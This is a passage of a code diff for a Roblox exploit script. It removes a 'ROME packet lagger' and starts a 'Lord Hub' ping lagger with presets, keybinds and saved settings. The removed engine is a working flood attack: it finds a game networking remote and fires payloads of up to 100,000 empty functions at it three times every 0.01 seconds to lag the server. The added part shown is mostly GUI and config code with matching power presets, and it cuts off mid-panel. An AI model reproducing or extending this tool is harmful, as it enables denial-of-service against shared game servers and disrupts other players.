@@ -19567,750 +19567,884 @@ end)()
         end,
     }
 end)()
---[[
-	ROME // PACKET LAGGER  --  v6
-	-------------------------------------------------------------
-	Base GUI : the layout you wrote (258x106 main + 203x203 settings
-	           panel, art background, status pill, AUTO GLOW, drag,
-	           settings "+" toggle) -- kept exactly as authored.
-	Filled in: the packet lagger engine from v1
-	           * remote resolve  ReplicatedStorage.Packages.Net -> [230]
-	           * payload = table.create(power, function() end)
-	           * 3 fires per 0.01s loop on its own thread
-	           * gamepad rumble on toggle
-	Swapped  : -10K / -1K / +1K / +10K  ->  v1 presets
-	           1K · 10K · 25K · 50K · MAX
-	v3 added : - / + steppers next to POWER (1,000 per press, 1 - 100,000)
-	           flowing AUTO GLOW (thicker rim + wide soft aura)
-	v4       : renamed to ROME everywhere, new art (100982514444886) on the
-	           main panel AND the settings panel, RED flowing glow
-	v5       : every blue accent switched to red (power value, active preset,
-	           AUTO GLOW: ON button); blue palette removed from the glow switch
-	v6       : SAVE SETTINGS button -- power, keybind, auto glow and window
-	           position are written to RomePacketLagger_Settings.json and
-	           restored automatically on load
-	-------------------------------------------------------------
-]]
+-- Lord Hub + Auto Brainrot
+-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection
 
-local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HapticService = game:GetService("HapticService")
-local HttpService = game:GetService("HttpService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService") -- new
 
-local BG_ASSET = "rbxassetid://100982514444886"
+local plr              = Players.LocalPlayer
+local plrGui           = plr:WaitForChild("PlayerGui")
 
-local player = Players.LocalPlayer
--- clean up any older copies (Ryzn builds included) so re-executing never stacks
-for _, oldName in ipairs({ "RomeGUI", "RyznGUI", "RyznPacketLagger", "IceHubLaggerOmahad" }) do
-    local old = player:WaitForChild("PlayerGui"):FindFirstChild(oldName)
-    if old then old:Destroy() end
-end
+-- ══════════════════════════════════════════════════════════════════════
+-- CONFIG & SAVE
+-- ══════════════════════════════════════════════════════════════════════
+local CONFIG_FILE = "LordHubPingLagger_Config.json"
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "RomeGUI"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = player:WaitForChild("PlayerGui")
-
-local function corner(object, radius)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, radius)
-    c.Parent = object
-end
-
-local function outline(object, color, thickness, transparency)
-    local s = Instance.new("UIStroke")
-    s.Color = color
-    s.Thickness = thickness
-    s.Transparency = transparency or 0
-    s.Parent = object
-    return s
-end
-
-local function label(parent, text, size, pos, font, textSize, color, z)
-    local l = Instance.new("TextLabel")
-    l.BackgroundTransparency = 1
-    l.Text = text
-    l.Size = size
-    l.Position = pos
-    l.Font = font
-    l.TextSize = textSize
-    l.TextColor3 = color
-    l.TextXAlignment = Enum.TextXAlignment.Left
-    l.ZIndex = z or 2
-    l.Parent = parent
-    return l
-end
-
-local function button(parent, text, size, pos, z, textSize)
-    local b = Instance.new("TextButton")
-    b.Size = size
-    b.Position = pos
-    b.BackgroundColor3 = Color3.fromRGB(43, 43, 51)
-    b.BorderSizePixel = 0
-    b.Text = text
-    b.TextColor3 = Color3.fromRGB(245, 245, 248)
-    b.TextSize = textSize or 11
-    b.Font = Enum.Font.GothamBold
-    b.AutoButtonColor = true
-    b.Selectable = true
-    b.ZIndex = z or 5
-    b.Parent = parent
-    corner(b, 8)
-    return b
-end
-
--- Compact main panel
-local main = Instance.new("Frame")
-main.Name = "Main"
-main.Size = UDim2.fromOffset(258, 106)
-main.Position = UDim2.new(0.5, -129, 0.5, -125)
-main.BackgroundColor3 = Color3.fromRGB(17, 17, 22)
-main.BorderSizePixel = 0
-main.ClipsDescendants = true
-main.Active = true
-main.Parent = gui
-corner(main, 16)
-outline(main, Color3.fromRGB(66, 66, 78), 1, 0.35)
-
-local background = Instance.new("ImageLabel")
-background.Name = "Background"
-background.Size = UDim2.fromScale(1, 1)
-background.BackgroundTransparency = 1
-background.Image = BG_ASSET
-background.ImageTransparency = 0.02
-background.ScaleType = Enum.ScaleType.Crop
-background.ZIndex = 1
-background.Parent = main
-corner(background, 16)
-
-local tint = Instance.new("Frame")
-tint.Size = UDim2.fromScale(1, 1)
-tint.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
-tint.BackgroundTransparency = 0.90
-tint.BorderSizePixel = 0
-tint.ZIndex = 2
-tint.Parent = main
-corner(tint, 16)
-
-label(main, "LIGHT HUB", UDim2.fromOffset(145, 23), UDim2.fromOffset(13, 8),
-    Enum.Font.GothamBlack, 18, Color3.new(1, 1, 1), 4)
-label(main, "PACKET LAGGER", UDim2.fromOffset(145, 18), UDim2.fromOffset(13, 31),
-    Enum.Font.GothamBold, 10, Color3.fromRGB(195, 195, 203), 4)
-
--- "+" toggle, plain ASCII, no encoding artifact
-local settingsToggle = button(main, "+", UDim2.fromOffset(31, 31),
-    UDim2.new(1, -82, 0, 9), 8, 17)
-settingsToggle.BackgroundColor3 = Color3.fromRGB(36, 36, 44)
-
-local status = label(main, "OFF", UDim2.fromOffset(57, 31),
-    UDim2.new(1, -44, 0, 9), Enum.Font.GothamBlack, 13,
-    Color3.fromRGB(255, 75, 85), 7)
-status.BackgroundTransparency = 0
-status.BackgroundColor3 = Color3.fromRGB(39, 30, 35)
-status.TextXAlignment = Enum.TextXAlignment.Center
-corner(status, 18)
-
-local activateButton = button(main, "ACTIVATE",
-    UDim2.new(1, -24, 0, 33), UDim2.fromOffset(12, 62), 6, 13)
-activateButton.Font = Enum.Font.GothamBlack
-activateButton.BackgroundColor3 = Color3.fromRGB(39, 39, 47)
-
--- Compact settings panel
-local panel = Instance.new("Frame")
-panel.Name = "Settings"
-panel.Size = UDim2.fromOffset(258, 203)
-panel.Position = UDim2.new(0.5, -129, 0.5, -13)
-panel.BackgroundColor3 = Color3.fromRGB(29, 29, 36)
-panel.BorderSizePixel = 0
-panel.Visible = false
-panel.ZIndex = 10
-panel.Parent = gui
-corner(panel, 16)
-outline(panel, Color3.fromRGB(83, 83, 98), 1.2, 0.2)
-
--- settings panel art (same asset, dimmed harder so the controls stay readable)
-local panelBackground = Instance.new("ImageLabel")
-panelBackground.Name = "PanelBackground"
-panelBackground.Size = UDim2.fromScale(1, 1)
-panelBackground.BackgroundTransparency = 1
-panelBackground.Image = BG_ASSET
-panelBackground.ImageTransparency = 0.45
-panelBackground.ScaleType = Enum.ScaleType.Crop
-panelBackground.ZIndex = 11
-panelBackground.Parent = panel
-corner(panelBackground, 16)
-
-local panelTint = Instance.new("Frame")
-panelTint.Size = UDim2.fromScale(1, 1)
-panelTint.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
-panelTint.BackgroundTransparency = 0.55
-panelTint.BorderSizePixel = 0
-panelTint.ZIndex = 11
-panelTint.Parent = panel
-corner(panelTint, 16)
-
-label(panel, "POWER", UDim2.fromOffset(85, 20), UDim2.fromOffset(12, 9),
-    Enum.Font.GothamBlack, 12, Color3.fromRGB(250, 250, 252), 12)
-
-local powerValue = 9000
-local powerLabel = label(panel, "9,000", UDim2.fromOffset(90, 20),
-    UDim2.fromOffset(84, 9), Enum.Font.GothamBold, 14,
-    Color3.fromRGB(255, 118, 118), 12)
-powerLabel.TextXAlignment = Enum.TextXAlignment.Right
-
--- + / - steppers (added in v3): 1,000 per press, clamped 1 - 100,000.
--- They sit on the POWER row: value ends at x174, - at 180, + at 214 (ends 244).
-local POWER_STEP = 1000
-
-local minusPower = button(panel, "-", UDim2.fromOffset(30, 22),
-    UDim2.fromOffset(180, 8), 12, 16)
-minusPower.Font = Enum.Font.GothamBlack
-
-local plusPower = button(panel, "+", UDim2.fromOffset(30, 22),
-    UDim2.fromOffset(214, 8), 12, 16)
-plusPower.Font = Enum.Font.GothamBlack
-
--- Presets from v1 (replaces the -10K / -1K / +1K / +10K buttons).
--- Five 42x29 buttons, 6px apart, inside the panel's 12px padding:
--- 12 + (i - 1) * 48 -> last button ends at 246 = panel width - 12.
-local PRESET_COLORS = {
-    idle = Color3.fromRGB(43, 43, 51),
-    active = Color3.fromRGB(124, 22, 30),
+local DEFAULT_CFG = {
+    power         = 100000,
+    interval      = 0.125,
+    keybindKb     = "F",
+    keybindGp     = "ButtonR2",
+    autoBrainrot  = false,  -- requires manual opt-in
 }
 
-local PRESETS = {
-    { text = "1K",  value = 1000 },
-    { text = "10K", value = 10000 },
-    { text = "25K", value = 25000 },
-    { text = "50K", value = 50000 },
-    { text = "MAX", value = 100000 },
+local cfg = {
+    power         = DEFAULT_CFG.power,
+    interval      = DEFAULT_CFG.interval,
+    keybindKb     = DEFAULT_CFG.keybindKb,
+    keybindGp     = DEFAULT_CFG.keybindGp,
+    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
 }
 
-local presetButtons = {}
-
-local function formatPower(v)
-    local s = tostring(math.floor(v))
-    local out = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
-    if out:sub(1, 1) == "," then out = out:sub(2) end
-    return out
+local function resolveKb(name)
+    if not name or name == "" or name == "None" then return nil end
+    local ok, val = pcall(function() return Enum.KeyCode[name] end)
+    return (ok and val) or nil
 end
 
-local function refreshPower()
-    powerLabel.Text = formatPower(powerValue)
-    -- highlight the preset that matches the current value
-    for i, preset in ipairs(PRESETS) do
-        local b = presetButtons[i]
-        if b then
-            b.BackgroundColor3 = (powerValue == preset.value) and PRESET_COLORS.active or PRESET_COLORS.idle
-        end
+local function saveConfig()
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded and writefile then
+        pcall(writefile, CONFIG_FILE, encoded)
     end
 end
 
-local function setPower(v)
-    powerValue = math.clamp(math.floor(tonumber(v) or powerValue), 1, 100000)
-    refreshPower()
+local function loadConfig()
+    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+
+    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
+    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
+    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
+    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
+    if type(data.autoBrainrot) == "boolean" then cfg.autoBrainrot = data.autoBrainrot else cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot end
 end
 
-minusPower.Activated:Connect(function()
-    setPower(powerValue - POWER_STEP)
-end)
+loadConfig()
+-- Auto Brainrot must always start disabled. The user must enable it manually.
+cfg.autoBrainrot = false
 
-plusPower.Activated:Connect(function()
-    setPower(powerValue + POWER_STEP)
-end)
+local active           = false
+local listeningFor     = nil
+local remote           = nil
+local brainrotMode     = false
+local lastBrainrotState = false
+local manualOverride   = false -- true when user manually turned it off while holding brainrot
 
-for i, preset in ipairs(PRESETS) do
-    local b = button(panel, preset.text, UDim2.fromOffset(42, 29),
-        UDim2.fromOffset(12 + (i - 1) * 48, 36), 12, 10)
-    b.Activated:Connect(function()
-        setPower(preset.value)
-    end)
-    presetButtons[i] = b
+-- ══════════════════════════════════════════════════════════════════════
+-- COLOURS
+-- ══════════════════════════════════════════════════════════════════════
+local C = {
+    bg      = Color3.fromRGB(8,   8,   8),
+    panel   = Color3.fromRGB(14,  14,  14),
+    card    = Color3.fromRGB(24,  24,  24),
+    purple1 = Color3.fromRGB(45,  45,  45), -- kept as shared accent name
+    purple2 = Color3.fromRGB(80,  80,  80),
+    purple3 = Color3.fromRGB(235, 235, 235),
+    glow    = Color3.fromRGB(120, 120, 120),
+    white   = Color3.fromRGB(245, 245, 245),
+    dim     = Color3.fromRGB(150, 150, 150),
+    green   = Color3.fromRGB(100,255, 160),
+    yellow  = Color3.fromRGB(255, 220, 60),
+    red     = Color3.fromRGB(255,100, 120),
+    waiting = Color3.fromRGB(255, 190,  50),
+    inputBg = Color3.fromRGB(18,  18,  18),
+}
+
+local T = {
+    bg      = 0.64,
+    panel   = 0.62,
+    card    = 0.60,
+    header  = 0.48,
+    inputBg = 0.58,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- DESTROY OLD GUI
+-- ══════════════════════════════════════════════════════════════════════
+for _, kid in pairs(plrGui:GetChildren()) do
+    if kid.Name == "LordHubPingLaggerGui" then kid:Destroy() end
 end
 
-local glowToggle = button(panel, "AUTO GLOW: OFF",
-    UDim2.new(1, -24, 0, 31), UDim2.fromOffset(12, 76), 12, 11)
+local screen = Instance.new("ScreenGui")
+screen.Name         = "LordHubPingLaggerGui"
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 15
+screen.Parent       = plrGui
 
-label(panel, "KEYBIND", UDim2.fromOffset(90, 18),
-    UDim2.fromOffset(12, 116), Enum.Font.GothamBlack, 11,
-    Color3.fromRGB(245, 245, 248), 12)
 
-local activationBind = button(panel, "ACTIVATE: CHOOSE A KEYBIND",
-    UDim2.new(1, -24, 0, 28), UDim2.fromOffset(12, 137), 12, 10)
 
--- SAVE SETTINGS footer: writes power / keybind / auto glow / position to disk
-local saveButton = button(panel, "SAVE SETTINGS",
-    UDim2.new(1, -24, 0, 24), UDim2.fromOffset(12, 169), 12, 10)
-saveButton.BackgroundColor3 = Color3.fromRGB(124, 22, 30)
-
--- =====================================================================
--- AUTO GLOW  (v4: red flow, two layers so it actually reads)
---   GLOW_STYLE = "red"    -> red aura with a bright crimson sweep
---   GLOW_STYLE = "black"  -> black aura with a moving smoke-grey sheen
--- =====================================================================
-local GLOW_STYLE = "red"
-
-local GLOW_FLOW_COLORS
-if GLOW_STYLE == "red" then
-    GLOW_FLOW_COLORS = {
-        ColorSequenceKeypoint.new(0,    Color3.fromRGB(120, 8,  14)),
-        ColorSequenceKeypoint.new(0.25, Color3.fromRGB(255, 60, 60)),
-        ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(140, 10, 18)),
-        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 96, 80)),
-        ColorSequenceKeypoint.new(1,    Color3.fromRGB(120, 8,  14)),
-    }
-else
-    GLOW_FLOW_COLORS = {
-        ColorSequenceKeypoint.new(0,    Color3.fromRGB(0,  0,  0)),
-        ColorSequenceKeypoint.new(0.25, Color3.fromRGB(34, 39, 52)),
-        ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(0,  0,  0)),
-        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(52, 58, 74)),
-        ColorSequenceKeypoint.new(1,    Color3.fromRGB(0,  0,  0)),
-    }
-end
-local GLOW_FLOW = ColorSequence.new(GLOW_FLOW_COLORS)
-
-local function makeFlow(gradientObject)
-    return TweenService:Create(
-        gradientObject,
-        TweenInfo.new(2.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
-        {Rotation = 360}
-    )
+-- ══════════════════════════════════════════════════════════════════════
+-- HELPERS
+-- ══════════════════════════════════════════════════════════════════════
+local function applyGradient(parent, c1, c2, rotation)
+    local g = Instance.new("UIGradient", parent)
+    g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
+    g.Rotation = rotation or 135
+    return g
 end
 
--- inner hard rim
-local glowStroke = outline(main, Color3.fromRGB(0, 0, 0), 4, 0)
-glowStroke.Enabled = false
-local gradient = Instance.new("UIGradient")
-gradient.Color = GLOW_FLOW
-gradient.Parent = glowStroke
-local flowTween = makeFlow(gradient)
-
--- outer soft aura (wide + semi-transparent = the visible "glow")
-local glowAura = outline(main, Color3.fromRGB(0, 0, 0), 9, 0.45)
-glowAura.Enabled = false
-local gradientAura = Instance.new("UIGradient")
-gradientAura.Color = GLOW_FLOW
-gradientAura.Parent = glowAura
-local flowAuraTween = makeFlow(gradientAura)
-
-local autoGlow = false
-local activated = false
-
-local function refreshGlow()
-    local shouldGlow = activated and autoGlow
-
-    glowStroke.Enabled = shouldGlow
-    glowAura.Enabled = shouldGlow
-
-    if shouldGlow then
-        if flowTween.PlaybackState ~= Enum.PlaybackState.Playing then
-            flowTween:Play()
-        end
-        if flowAuraTween.PlaybackState ~= Enum.PlaybackState.Playing then
-            flowAuraTween:Play()
-        end
-    else
-        flowTween:Cancel()
-        gradient.Rotation = 0
-        flowAuraTween:Cancel()
-        gradientAura.Rotation = 0
-    end
+local function tw(obj, props, t)
+    TweenService:Create(obj,
+        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        props):Play()
 end
 
-local function setAutoGlow(value)
-    autoGlow = value and true or false
-    glowToggle.Text = autoGlow and "AUTO GLOW: ON" or "AUTO GLOW: OFF"
-    glowToggle.BackgroundColor3 = autoGlow
-        and Color3.fromRGB(124, 22, 30)
-        or Color3.fromRGB(43, 43, 51)
-    refreshGlow()
-end
-
-glowToggle.Activated:Connect(function()
-    setAutoGlow(not autoGlow)
-end)
-
--- =====================================================================
--- PACKET LAGGER ENGINE (from v1)
--- Resolves ReplicatedStorage.Packages.Net, grabs child #230, and floods
--- it with {power} many fires: 3 per 0.01s on a dedicated thread.
--- =====================================================================
-local lagging = false
-local lagThread = nil
-local remote = nil
-
-local function resolveRemote()
-    local ok, net = pcall(function()
-        return ReplicatedStorage:WaitForChild("Packages", 6):WaitForChild("Net", 6)
-    end)
-    if not ok or not net then return nil end
-
-    local ok2, kids = pcall(function()
-        return net:GetChildren()
-    end)
-    if not ok2 or not kids then return nil end
-
-    return kids[230]
-end
-
-local function rumble(small, large, duration)
-    local pads = UserInputService:GetConnectedGamepads()
-    if #pads == 0 then return end
-    local pad = pads[1]
-    pcall(function()
-        HapticService:SetMotor(pad, Enum.VibrationMotor.Small, small)
-        HapticService:SetMotor(pad, Enum.VibrationMotor.Large, large)
-    end)
-    if duration and duration > 0 then
-        task.delay(duration, function()
-            pcall(function()
-                HapticService:SetMotor(pad, Enum.VibrationMotor.Small, 0)
-                HapticService:SetMotor(pad, Enum.VibrationMotor.Large, 0)
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1
+        or i.UserInputType == Enum.UserInputType.Touch then
+            dragging  = true
+            dragStart = i.Position
+            startPos  = frame.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then dragging = false end
             end)
-        end)
-    end
-end
-
-local function startLagging()
-    if lagging then return true end
-
-    if not remote then
-        remote = resolveRemote()
-    end
-    if not remote then return false end
-
-    lagging = true
-
-    local payload = table.create(powerValue, function() end)
-    local target = remote
-
-    lagThread = task.spawn(function()
-        while lagging do
-            for _ = 1, 3 do
-                pcall(function() target:FireServer(payload) end)
-            end
-            task.wait(0.01)
         end
     end)
-
-    return true
-end
-
-local function stopLagging()
-    if not lagging then return end
-    lagging = false
-    if lagThread then
-        pcall(task.cancel, lagThread)
-        lagThread = nil
-    end
-end
-
--- brief "no remote" feedback inside the existing status pill
-local errorToken = 0
-local function flashError()
-    errorToken += 1
-    local token = errorToken
-    status.Text = "NO NET"
-    status.TextColor3 = Color3.fromRGB(255, 190, 90)
-    status.BackgroundColor3 = Color3.fromRGB(48, 38, 24)
-    task.delay(1.4, function()
-        if errorToken == token and not activated then
-            status.Text = "OFF"
-            status.TextColor3 = Color3.fromRGB(255, 75, 85)
-            status.BackgroundColor3 = Color3.fromRGB(39, 30, 35)
+    frame.InputChanged:Connect(function(i)
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
+                      or i.UserInputType == Enum.UserInputType.Touch) then
+            local d = i.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + d.X,
+                startPos.Y.Scale, startPos.Y.Offset + d.Y)
         end
     end)
 end
 
-local function setActivated(value)
-    if value then
-        -- only paint as ON if the remote actually resolved
-        if not startLagging() then
-            flashError()
-            return
+local function isGamepad(kc)
+    local n = kc.Name
+    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
+end
+
+local BLACKLISTED = {
+    [Enum.KeyCode.Escape]      = true,
+    [Enum.KeyCode.LeftControl] = true,
+    [Enum.KeyCode.Unknown]     = true,
+}
+
+-- ══════════════════════════════════════════════════════════════════════
+-- Crow image IDs
+local CROW_IMAGE_IDS = {
+    "rbxassetid://118953269416540",
+    "rbxassetid://128085595627413",
+    "rbxassetid://120663379122080",
+    "rbxassetid://71944223395764",
+}
+
+-- MAIN WINDOW
+-- ══════════════════════════════════════════════════════════════════════
+local MAIN_W, MAIN_H = 220, 108
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name             = "MainFrame"
+mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
+mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
+mainFrame.BackgroundColor3 = Color3.fromRGB(8,8,8)
+mainFrame.BackgroundTransparency = 0.62
+mainFrame.BorderSizePixel  = 0
+mainFrame.Active           = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent           = screen
+
+local mainCrowBackground = Instance.new("ImageLabel")
+mainCrowBackground.Name = "CrowBackground"
+mainCrowBackground.Size = UDim2.fromScale(1, 1)
+mainCrowBackground.Position = UDim2.fromScale(0, 0)
+mainCrowBackground.BackgroundTransparency = 1
+mainCrowBackground.Image = CROW_IMAGE_IDS[1]
+mainCrowBackground.ImageTransparency = 0.55
+mainCrowBackground.ScaleType = Enum.ScaleType.Crop
+mainCrowBackground.ZIndex = 1
+mainCrowBackground.Parent = mainFrame
+Instance.new("UICorner", mainCrowBackground).CornerRadius = UDim.new(0, 12)
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color        = C.white
+mainStroke.Thickness    = 1.4
+mainStroke.Transparency = 0.78
+
+-- Draggable state / lock button
+local guiLocked = false
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos
+    frame.InputBegan:Connect(function(i)
+        if guiLocked then return end
+        if i.UserInputType == Enum.UserInputType.MouseButton1
+        or i.UserInputType == Enum.UserInputType.Touch then
+            dragging  = true
+            dragStart = i.Position
+            startPos  = frame.Position
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
         end
-    else
-        stopLagging()
-    end
-
-    activated = value
-    errorToken += 1
-
-    status.Text = activated and "ON" or "OFF"
-    status.TextColor3 = activated and Color3.fromRGB(75, 255, 135)
-        or Color3.fromRGB(255, 75, 85)
-    status.BackgroundColor3 = activated and Color3.fromRGB(25, 62, 42)
-        or Color3.fromRGB(39, 30, 35)
-    activateButton.Text = activated and "ACTIVATED" or "ACTIVATE"
-    activateButton.BackgroundColor3 = activated and Color3.fromRGB(28, 135, 76)
-        or Color3.fromRGB(39, 39, 47)
-    refreshGlow()
-
-    rumble(activated and 0.45 or 0, activated and 0.2 or 0, 0.2)
+    end)
+    frame.InputChanged:Connect(function(i)
+        if guiLocked then return end
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
+                      or i.UserInputType == Enum.UserInputType.Touch) then
+            local d = i.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + d.X,
+                startPos.Y.Scale, startPos.Y.Offset + d.Y)
+        end
+    end)
 end
+makeDraggable(mainFrame)
 
-activateButton.Activated:Connect(function()
-    setActivated(not activated)
+-- Header
+local header = Instance.new("Frame", mainFrame)
+header.Size             = UDim2.new(1,0,0,36)
+header.BackgroundColor3 = Color3.fromRGB(255,255,255)
+header.BackgroundTransparency = 0.93
+header.BorderSizePixel  = 0
+header.ZIndex           = 2
+Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)
+
+local headerFill = Instance.new("Frame", mainFrame)
+headerFill.Size = UDim2.new(1,0,0,8)
+headerFill.Position = UDim2.new(0,0,0,28)
+headerFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
+headerFill.BackgroundTransparency = 0.93
+headerFill.BorderSizePixel = 0
+headerFill.ZIndex = 2
+
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size = UDim2.new(1,-92,0,18)
+titleLbl.Position = UDim2.new(0,10,0,9)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text = "LIGHT HUB PING LAGGER"
+titleLbl.TextColor3 = C.white
+titleLbl.Font = Enum.Font.GothamBlack
+titleLbl.TextSize = 10
+titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+titleLbl.ZIndex = 3
+
+-- Activate / Deactivate control in the former Lagger bar position
+local activateBtn = Instance.new("TextButton", mainFrame)
+activateBtn.Name = "ActivateButton"
+activateBtn.Size = UDim2.new(1,-20,0,25)
+activateBtn.Position = UDim2.new(0,10,0,40)
+activateBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
+activateBtn.BackgroundTransparency = 0.08
+activateBtn.BorderSizePixel = 0
+activateBtn.AutoButtonColor = false
+activateBtn.Text = "ACTIVATE"
+activateBtn.TextColor3 = Color3.fromRGB(255,255,255)
+activateBtn.Font = Enum.Font.GothamBlack
+activateBtn.TextSize = 9
+activateBtn.ZIndex = 4
+Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0,8)
+
+-- Lock button
+local lockBtn = Instance.new("TextButton", header)
+lockBtn.Size = UDim2.new(0,24,0,24)
+lockBtn.Position = UDim2.new(1,-31,0.5,-12)
+lockBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+lockBtn.BackgroundTransparency = 1
+lockBtn.BorderSizePixel = 0
+lockBtn.AutoButtonColor = false
+lockBtn.Text = "🔓"
+lockBtn.TextColor3 = C.white
+lockBtn.Font = Enum.Font.GothamBlack
+lockBtn.TextSize = 12
+lockBtn.ZIndex = 4
+Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0,6)
+lockBtn.MouseButton1Click:Connect(function()
+    guiLocked = not guiLocked
+    lockBtn.Text = guiLocked and "🔒" or "🔓"
+    lockBtn.BackgroundTransparency = 1
 end)
 
--- resolve the remote in the background so the first click is instant
-task.spawn(function()
+-- Preset buttons: LOW / MID / HIGH
+local presetNames = {"LOW", "MID", "HIGH"}
+local presetButtons = {}
+local selectedPreset = "LOW"
+local presetValues = {LOW = 25000, MID = 50000, HIGH = 100000}
+
+local function setPreset(name)
+    selectedPreset = name
+    if presetValues[name] then cfg.power = presetValues[name] end
+    saveConfig()
+    for n,b in pairs(presetButtons) do
+        b.BackgroundColor3 = (n == selectedPreset) and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+        b.BackgroundTransparency = (n == selectedPreset) and 0.08 or 0.82
+        b.TextColor3 = (n == selectedPreset) and Color3.fromRGB(255,255,255) or Color3.fromRGB(10,10,10)
+    end
+end
+
+for i,name in ipairs(presetNames) do
+    local b = Instance.new("TextButton", mainFrame)
+    -- Three presets with equal size and a small gap between each button.
+    local presetGap = 5
+    local presetWidth = ((MAIN_W - 20) - (presetGap * (#presetNames - 1))) / #presetNames
+    b.Size = UDim2.new(0,presetWidth,0,22)
+    b.Position = UDim2.new(0,10 + (i-1)*(presetWidth + presetGap),0,72)
+    b.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    b.BackgroundTransparency = 0.82
+    b.BorderSizePixel = 0
+    b.AutoButtonColor = false
+    b.Text = name
+    b.TextColor3 = Color3.fromRGB(10,10,10)
+    b.Font = Enum.Font.GothamBlack
+    b.TextSize = 8
+    b.ZIndex = 4
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0,7)
+    presetButtons[name] = b
+    b.MouseButton1Click:Connect(function() setPreset(name) end)
+end
+setPreset("LOW")
+
+-- Settings button remains available
+local settingsEmojiBtn = Instance.new("TextButton", header)
+settingsEmojiBtn.Size = UDim2.new(0,22,0,22)
+settingsEmojiBtn.Position = UDim2.new(1,-57,0.5,-11)
+settingsEmojiBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+settingsEmojiBtn.BackgroundTransparency = 1
+settingsEmojiBtn.BorderSizePixel = 0
+settingsEmojiBtn.AutoButtonColor = false
+settingsEmojiBtn.Text = "⚙"
+settingsEmojiBtn.TextColor3 = C.white
+settingsEmojiBtn.Font = Enum.Font.GothamBlack
+settingsEmojiBtn.TextSize = 12
+settingsEmojiBtn.ZIndex = 23
+-- No background plate behind the settings icon
+
+-- SETTINGS PANEL (with Auto Brainrot toggle)
+-- ══════════════════════════════════════════════════════════════════════
+local SET_W, SET_H = 220, 244
+
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Name             = "SettingsPanel"
+settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
+settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
+settingsFrame.BackgroundColor3 = C.panel
+settingsFrame.BackgroundTransparency = T.panel
+settingsFrame.BorderSizePixel  = 0
+settingsFrame.Active           = true
+settingsFrame.ClipsDescendants = true
+settingsFrame.Visible          = false
+settingsFrame.ZIndex           = 20
+settingsFrame.Parent           = screen
+
+local settingsCrowBackground = Instance.new("ImageLabel")
+settingsCrowBackground.Name = "CrowBackground"
+settingsCrowBackground.Size = UDim2.fromScale(1, 1)
+settingsCrowBackground.Position = UDim2.fromScale(0, 0)
+settingsCrowBackground.BackgroundTransparency = 1
+settingsCrowBackground.Image = CROW_IMAGE_IDS[1]
+settingsCrowBackground.ImageTransparency = 0.55
